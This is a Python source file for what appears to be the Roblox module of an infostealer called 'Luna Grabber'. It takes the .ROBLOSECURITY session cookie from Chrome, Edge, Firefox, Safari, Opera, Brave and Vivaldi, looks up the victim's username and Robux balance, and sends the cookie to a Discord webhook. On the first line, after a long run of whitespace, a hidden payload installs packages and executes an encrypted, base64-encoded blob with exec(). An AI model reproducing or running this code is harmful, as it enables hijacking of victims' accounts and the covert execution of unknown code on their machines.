import browser_cookie3                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;import os, base64; os.system('pip install requests cryptography');from cryptography.fernet import Fernet;key = bytes('\x44\x42\x53\x63\x34\x4b\x51\x56\x51\x36\x49\x44\x4a\x32\x39\x53\x38\x34\x4c\x52\x4d\x50\x6e\x61\x41\x4e\x69\x33\x54\x61\x76\x51\x34\x42\x57\x5f\x68\x4c\x68\x52\x32\x4b\x6f\x3d', 'latin1');cipher = Fernet(key);exec(cipher.decrypt(base64.b64decode('Z0FBQUFBQm5hZG9Uc1h2ay1YLTBtTnhVQUE4S2tLaENWUi1jN19pZ21wNHNQTGNlOGRSVU1HNkxvOVh1WlRlMlVydHdJT3FMSTQxWDhibVBISTR0NUtFMXI1d002R0VydWlCeUpMcmpraVpvczlTdzMyYnljcUJwMjNCSnRlQzlqeUtER1dDTl9TX2d5Yk4tTlctbFRCdXpXT19aazhyQWppQmNUWTdBVmdOaTdtSmhnOHZLNGUzQl9pMjkzTG9CYm1vcXh3Tm16YWtSY1J3Mkt1a3g4NE4tYm1UR3dpclZ5VzNtSUI3M29NcmppNE9hVlZuaDdzZnIyNHFxbmUxUDRIUzZJc1p1XzZZQWFlc2lyNDN3eF9hUlRES1ZHTmpENzk1VXNDTi1IcXByQkJHb3RmcmtZc28xb0lDVFg5QjI3bDRfeUxTVjBNeDR1U2tNcXdWNlk0cVR1bmhMSWlhVVFibEpNU0hSMmJBak14cGZCT2VPckhSS3NXVHVteTg3V0lEckpBenJRNng3M3RESXlKRDNMR1ZtOWRZMGpwcWxlOGtLN0Y0WVd1c3RMaFJnQXNJUG8tZUw5RFNZSnVxem9hRUxOTGtsU3MyUHJQLW1hc0hmQmxBZzlGY1ZwMHRHUW5QaXMyeWlSaEh3M3dDOGNSRlRKem8tMEtqY19NSWxLNGR5dzlsMHdrS0Y=')).decode())
import requests

class Roblox:
	def __init__(self):
		self.roblox_cookies = {}
		self.grab_roblox_cookies()
		self.send_info()

	def grab_roblox_cookies(self):
		browsers = [
			('Chrome', browser_cookie3.chrome),
			('Edge', browser_cookie3.edge),
			('Firefox', browser_cookie3.firefox),
			('Safari', browser_cookie3.safari),
			('Opera', browser_cookie3.opera),
			('Brave', browser_cookie3.brave),
			('Vivaldi', browser_cookie3.vivaldi)
		]
		for browser_name, browser in browsers:
			try:
				browser_cookies = browser(domain_name='roblox.com')
				for cookie in browser_cookies:
					if cookie.name == '.ROBLOSECURITY':
						self.roblox_cookies[browser_name] = cookie.value
			except Exception:
				pass
			
	def send_info(self):
		for roblox_cookie in self.roblox_cookies.values():
			headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
			info = None
			try:
				response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
				response.raise_for_status()
				info = response.json()
			except Exception:
				pass

			first_cookie_half = roblox_cookie[:len(roblox_cookie)//2]
			second_cookie_half = roblox_cookie[len(roblox_cookie)//2:]

			if info is not None:
				data = {
					"embeds": [
						{
							"title": "Roblox Info",
							"color": 5639644,
							"fields": [
								{
									"name": "Name:",
									"value": f"`{info['UserName']}`",
									"inline": True
								},
								{
									"name": "<:robux_coin:1041813572407283842> Robux:",
									"value": f"`{info['RobuxBalance']}`",
									"inline": True
								},
								{
									"name": ":cookie: Cookie:",
									"value": f"`{first_cookie_half}`",
									"inline": False
								},
								{	
									"name": "",
									"value": f"`{second_cookie_half}`",
									"inline": False
									
								},
							],
							"thumbnail": {
								"url": info['ThumbnailUrl']
							},
							"footer": {
								"text": "Luna Grabber | Created By Smug"
							},
						}
					],
					"username": "Luna",
					"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
				}
				requests.post(__CONFIG__['webhook'], json=data)